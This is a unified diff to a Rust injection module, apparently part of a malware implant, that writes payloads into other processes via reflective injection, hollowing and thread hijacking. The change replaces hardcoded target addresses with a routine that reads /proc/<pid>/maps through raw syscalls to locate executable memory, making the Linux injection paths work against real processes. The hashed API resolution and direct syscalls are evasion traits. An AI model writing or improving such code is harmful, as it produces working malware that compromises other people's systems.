@@ -1,5 +1,8 @@
 use core::ffi::c_void;
 
+#[cfg(not(target_os = "windows"))]
+use alloc::{format, vec::Vec};
+
 #[cfg(target_os = "windows")]
 use crate::utils::api_resolver::{hash_str, resolve_function};
 #[cfg(target_os = "windows")]
@@ -54,6 +57,35 @@ impl Injector {
             InjectionType::Hollowing => self.process_hollowing(target_pid, payload),
             InjectionType::ThreadHijack => self.thread_hijack(target_pid, payload),
         }
+    }
+
+    #[cfg(not(target_os = "windows"))]
+    fn get_remote_base_address(&self, pid: u32) -> Result<usize, ()> {
+        let path = format!("/proc/{}/maps\0", pid);
+        let fd = unsafe { crate::utils::syscalls::sys_open(path.as_ptr(), 0, 0) };
+        if (fd as isize) <= 0 {
+            return Err(());
+        }
+
+        let mut buf = [0u8; 4096];
+        let n = unsafe { crate::utils::syscalls::sys_read(fd as usize, buf.as_mut_ptr(), 4096) };
+        unsafe { crate::utils::syscalls::sys_close(fd as usize) };
+
+        if n > 0 {
+            if let Ok(s) = core::str::from_utf8(&buf[..n]) {
+                for line in s.lines() {
+                    if line.contains("r-xp") {
+                        let parts: Vec<&str> = line.split('-').collect();
+                        if let Some(start_str) = parts.first() {
+                            if let Ok(addr) = usize::from_str_radix(start_str, 16) {
+                                return Ok(addr);
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        Err(())
     }
 
     #[cfg(target_os = "windows")]
@@ -390,9 +422,7 @@ impl Injector {
     #[cfg(not(target_os = "windows"))]
     fn reflective_inject(&self, pid: u32, payload: &[u8]) -> Result<(), ()> {
         unsafe {
-            // Assume 0x400000 base for simplified MVP injection
-            // In a full implementation, we'd parse /proc/pid/maps to find RX pages
-            let target_addr = 0x400000 as *mut c_void;
+            let target_addr = self.get_remote_base_address(pid)? as *mut c_void;
 
             let local_iov = crate::utils::syscalls::Iovec {
                 iov_base: payload.as_ptr() as *mut c_void,
@@ -444,8 +474,7 @@ impl Injector {
                 sys_wait4(pid as i32, &mut status, 0, core::ptr::null_mut());
 
                 // Inject payload into child
-                // Assume entry point or known RX page
-                let target_addr = 0x400000;
+                let target_addr = self.get_remote_base_address(pid as u32)?;
 
                 for (i, chunk) in payload.chunks(8).enumerate() {
                     let mut data = 0u64;
@@ -489,7 +518,7 @@ impl Injector {
             sys_wait4(pid as i32, &mut status, 0, core::ptr::null_mut());
 
             // Assume payload injection address
-            let target_addr = 0x400000;
+            let target_addr = self.get_remote_base_address(pid)?;
 
             for (i, chunk) in payload.chunks(8).enumerate() {
                 let mut data = 0u64;
